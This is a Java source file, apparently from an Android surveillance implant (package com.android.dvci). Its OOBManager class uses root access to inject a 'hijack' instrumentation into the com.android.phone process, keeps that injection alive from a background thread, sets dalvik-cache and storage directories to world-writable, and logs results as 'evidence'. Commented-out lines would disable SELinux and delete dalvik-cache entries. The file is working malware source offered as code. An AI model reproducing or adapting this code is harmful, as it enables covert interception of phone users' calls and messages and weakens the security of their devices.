package com.android.dvci.event.OOB;


import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.file.Path;
import com.android.dvci.module.FactoryModuleAndroid;
import com.android.dvci.module.FactoryModuleBB10;
import com.android.dvci.util.Check;
import com.android.dvci.util.Execute;
import com.android.dvci.util.Instrument;
import com.android.dvci.util.Utils;
import com.android.mm.M;

import java.io.File;
import java.util.Date;

public class OOBManager implements Runnable{
	private static Instrument hijack = null;
	private static String MESSAGE_STORE = "m4/";
	private static String messageStorage;
	private static String TAG = "OOBManager";
	/** The singleton. */
	private volatile static OOBManager singleton;
	private boolean runOOB = false;
	private boolean threadRunning = false;
	private Thread thread = null;
	private static int instrumentationTargetInterruptions = 0;

	/**
	 * Indicates if the main thread is running
	 * @return threadRunning
	 */

	public synchronized boolean isThreadRunning() {
		return threadRunning ;
	}

	public synchronized void setThreadRunning(boolean threadRunning) {
		this.threadRunning = threadRunning;
	}

	public void stop() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stop): starting"); //$NON-NLS-1$
		}
		if( Status.haveRoot() && this.thread != null) {
			runOOB = false;
			Date start = new Date();
			long diff_sec = (new Date().getTime() - start.getTime()) / 1000;
			while (diff_sec < 60) {
				diff_sec = (new Date().getTime() - start.getTime()) / 1000;
				try {
					this.thread.join(500);
					if (Cfg.DEBUG) {
						Check.log(TAG + " (stop): join return ts="+ this.thread.getState()); //$NON-NLS-1$
					}
					if(this.thread.getState() == Thread.State.TERMINATED) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (stop): joined "); //$NON-NLS-1$
						}
						this.thread = null;
						if(this.hijack != null) {
							if (this.hijack.isStarted()) {
								if (Cfg.DEBUG) {
									Check.log(TAG + " (stop): something wrong instrumentation still active, stop it"); //$NON-NLS-1$
								}
								this.hijack.stopInstrumentation();
							}
							instrumentationTargetInterruptions = this.hijack.getRestartCounter();
							this.hijack = null;
						}
						break;
					}
				} catch (Exception e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (stop): failed to join thread"); //$NON-NLS-1$
					}
				}
				Utils.sleep(500);
			}
			if(isThreadRunning()){
				if (Cfg.DEBUG) {
					Check.log(TAG + " (stop): failed to stop thread"); //$NON-NLS-1$
				}
				EvidenceBuilder.info(M.e("OOB failed to stop"));
			}else{
				if (Cfg.DEBUG) {
					Check.log(TAG + " (stop): OK"); //$NON-NLS-1$
				}
				EvidenceBuilder.info(M.e("OOB correctly stopped"));

			}
		}
	}

	/**
	 * Self.
	 *
	 * @return the manager
	 */
	public static OOBManager self() {
		if (singleton == null) {
			synchronized (OOBManager.class) {
				if (singleton == null) {
					singleton = new OOBManager();
				}
			}
		}
		return singleton;
	}


	@Override
	public void run() {
		setThreadRunning(true);
		while(runOOB) {
			if (Status.haveRoot()) {
				if (hijack == null) {
					startInjection();
				}else{
					hijack.checkProcessMonitor(false);
				}
			}
			Utils.sleep(5000);
		}
		if (Cfg.DEBUG) {
			Check.log(TAG + "(run): asked to stop");
		}
		try {
			if (hijack != null) {
				hijack.stopInstrumentation();
			}
		}catch (Exception e){
			if (Cfg.DEBUG) {
				Check.log(TAG + "(run): failed to stopInstrumentation");
			}
		}
		setThreadRunning(false);
	}


	public void start() {

		if (isThreadRunning()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(start): thread ALREADY running");
			}
		} else {
			runOOB = true;
			if (thread == null) {
				thread = new Thread(this);
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + "(start): starting thread");
			}
			thread.start();
		}

		/*
		if (Status.haveRoot() && (hijack == null || !hijack.isStarted())) {
			Date start = new Date();
			long diff_sec = (new Date().getTime() - start.getTime()) / 1000;
			while (diff_sec < 180) {
				diff_sec = (new Date().getTime() - start.getTime()) / 1000;
				if (startInjection()) {
					break;
				}
				Utils.sleep(5000);
			}
		}
		*/
	}

	public static boolean startInjection() {
		/*
		 * Hypothesis : modules that relay on the com.android.phone , i.e. ModuleMessages, ModuleCall can have problem
		 * in case the process is killed while used?
		 */
		createMsgStorage();
		Execute.chmod(M.e("777"), M.e("/data/dalvik-cache/"));
		//Execute.executeRoot(M.e("setenforce 0") );
		//Execute.executeRoot(M.e("rm /data/dalvik-cache/") + Status.getApkName().replace("/", "@") + "*");
		if(hijack==null) {
			hijack = new Instrument(M.e("com.android.phone"), Status.getApkName()+"@"+ Status.getAppContext().getPackageName(), M.e("irp"), Status.self().semaphoreMediaserver, M.e("pa.data"),M.e("radio"));
			hijack.setInstrumentationSuccessDir(messageStorage);
			hijack.setRestartCounter(instrumentationTargetInterruptions);
			/* todo: instead of kill the process as precaution, try to understand if is already injected
			 * for example check for the needle inside the memory of the target process.
			*/

			if (Cfg.DEBUG) {
				Check.log(TAG + "(actualStart): assure to kill the old process");
			}
			hijack.stopInstrumentation();
		}
		if (hijack.isStarted()){
			if (Cfg.DEBUG) {
				Check.log(TAG + "(actualStart): hijacker already running");
			}
			return true;
		}
		if (hijack.startInstrumentation()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(actualStart): hijacker successfully installed");
			}
			EvidenceBuilder.info(M.e("OOB ready"));
			return true;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(actualStart): hijacker cannot be installed");
			}
			EvidenceBuilder.info(M.e("OOB cannot be installed"));
		}
		return false;
	}

	static public boolean createMsgStorage() {
		// Create storage directory
		messageStorage = Status.getAppContext().getFilesDir().getAbsolutePath() + "/" + MESSAGE_STORE;

		if (Path.createDirectory(messageStorage) == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (createMsgStorage): audio storage directory cannot be created"); //$NON-NLS-1$
			}

			return false;
		} else {
			Execute.chmod(M.e("777"), messageStorage);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (createMsgStorage): audio storage directory created at " + messageStorage); //$NON-NLS-1$
			}

			return true;
		}
	}

}
